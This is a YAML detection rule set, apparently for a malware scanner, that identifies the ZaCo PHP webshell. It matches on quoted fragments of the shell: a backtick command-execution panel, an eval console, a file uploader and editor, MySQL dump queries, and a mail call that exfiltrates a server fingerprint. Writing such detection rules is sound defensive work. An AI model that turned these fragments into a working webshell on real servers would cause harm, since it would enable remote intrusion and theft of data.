defaults:
  for: [scripts]
  platforms:
    - linux
    - macos
    - windows
    - unix
    - android
    - ios
  size_min: 8000
  size_max: 50000
  attack: T1505.003
  mbc: B0030
traits:
  - id: family-banner
    desc: ZaCo webshell banner
    crit: suspicious
    conf: 0.99
    if:
      type: raw
      exact: <title>Small Web Shell by ZaCo</title>
  - id: page-router
    desc: Three-mode page router
    crit: notable
    conf: 0.97
    if:
      type: raw
      exact: $page=$page==''||($page!='cmd'&&$page!='mysql'&&$page!='eval')?'cmd':$page;
  - id: page-switch
    desc: Page switch dispatcher
    crit: notable
    conf: 0.95
    if:
      type: raw
      exact: switch($page)
  - id: magic-quotes-normalizer
    desc: Magic quotes input normalizer
    crit: suspicious
    conf: 0.96
    if:
      type: raw
      exact: function magic_q($s)
  - id: os-aware-routing
    desc: OS-aware execution branch
    crit: notable
    conf: 0.94
    if:
      type: raw
      exact: $winda=strpos(strtolower(php_uname()),'wind');
  - id: tracker-fingerprint-bundle
    desc: Server fingerprint mail bundle
    crit: suspicious
    conf: 0.98
    attack: T1048
    if:
      type: raw
      exact: $msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
  - id: tracker-mail-call
    desc: Tracker mail exfil call
    crit: suspicious
    conf: 0.99
    attack: T1048
    if:
      type: raw
      exact: 'mail($sd98, $sj98, $msg8873, "From: $sd98");'
  - id: cmd-backtick-rce
    desc: Backtick command execution panel
    crit: suspicious
    conf: 0.98
    attack: T1059.004
    if:
      type: raw
      exact: if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd)."</strong><hr>\n<textarea cols=120 rows=20>\n".htmlspecialchars(`$cmd`)."\n</textarea>");}
  - id: eval-panel
    desc: Embedded eval console panel
    crit: suspicious
    conf: 0.98
    attack: T1059.006
    if:
      type: raw
      exact: <input name='action' value='eval_in_html' type='submit'>
  - id: dir-browser
    desc: Interactive directory browser loop
    crit: notable
    conf: 0.96
    if:
      type: raw
      exact: while(false!==($fn=readdir($handle))){$files[]=$fn;};
  - id: unix-owner-enum
    desc: Unix owner group resolution
    crit: notable
    conf: 0.95
    if:
      type: raw
      exact: $owner=@posix_getpwuid(@fileowner($work_dir.$fn));
  - id: file-editor
    desc: In-browser file editor
    crit: suspicious
    conf: 0.97
    if:
      type: raw
      exact: <textarea name='file_text' cols=120 rows=20><?if(!($f))echo($e_work_dir.' not exists');else while(!feof($f))echo htmlspecialchars(fread($f,100000))?></textarea>
  - id: file-uploader
    desc: Uploaded file copy handler
    crit: suspicious
    conf: 0.98
    attack: T1105
    if:
      type: raw
      exact: if(!@copy($_FILES["filename"]["tmp_name"], $work_dir.$f)) echo('Upload is failed');
  - id: gzip-downloader
    desc: Gzip file download handler
    crit: suspicious
    conf: 0.97
    if:
      type: raw
      exact: Header("Content-Type:application/x-gzip\n");
  - id: mysql-connect
    desc: MySQL admin connection panel
    crit: notable
    conf: 0.97
    if:
      type: raw
      exact: $mysql_link=@mysql_connect($host,$user,$passwd);
  - id: mysql-console
    desc: MySQL web query console
    crit: suspicious
    conf: 0.97
    if:
      type: raw
      exact: <tr><td>User :<input name='user' type=text value='<?=$user?>'></td><td>Passwd :<input name='passwd' type=text value='<?=$passwd?>'></td><td>Host :<input name='host' type=text value='<?=$host?>'></td><td>DB :<input name='db' type=text value='<?=$db?>'></td></tr>
  - id: mysql-dumper-banner
    desc: ZaCo MySQL dumper banner
    crit: suspicious
    conf: 0.98
    if:
      type: raw
      exact: $dump_file="#ZaCo MySQL Dumper\n#db $db from $host\n";
  - id: mysql-show-tables
    desc: MySQL show tables dumper
    crit: notable
    conf: 0.95
    if:
      type: raw
      exact: $result=mysql_query('show tables',$mysql_link);
  - id: mysql-show-columns
    desc: MySQL schema dump loop
    crit: notable
    conf: 0.95
    if:
      type: raw
      exact: $result2=@mysql_query('show columns from `'.$rows[0].'`',$mysql_link);
composite_rules:
  - id: tracker-exfiltration
    desc: Mail-based server fingerprint exfiltration
    crit: suspicious
    conf: 0.995
    attack: T1048
    all:
      - id: tracker-fingerprint-bundle
      - id: tracker-mail-call
    any:
      - id: micro-behaviors/communications/email/send::gmail-phone-home-subject
      - id: family-banner
  - id: file-manager
    desc: Webshell file management console
    crit: suspicious
    conf: 0.99
    all:
      - id: dir-browser
    any:
      - id: file-editor
      - id: file-uploader
      - id: gzip-downloader
      - id: unix-owner-enum
  - id: mysql-admin-surface
    desc: Webshell MySQL admin surface
    crit: suspicious
    conf: 0.99
    all:
      - id: mysql-connect
    any:
      - id: mysql-console
      - id: mysql-dumper-banner
      - id: mysql-show-tables
      - id: mysql-show-columns
    needs: 2
  - id: execution-surface
    desc: Webshell command execution surfaces
    crit: suspicious
    conf: 0.99
    any:
      - id: cmd-backtick-rce
      - id: eval-panel
  - id: family-detected
    desc: ZaCo PHP webshell family
    crit: hostile
    conf: 0.999
    all:
      - id: family-banner
      - id: page-router
      - id: magic-quotes-normalizer
    any:
      - id: tracker-exfiltration
      - id: file-manager
      - id: mysql-admin-surface
      - id: execution-surface
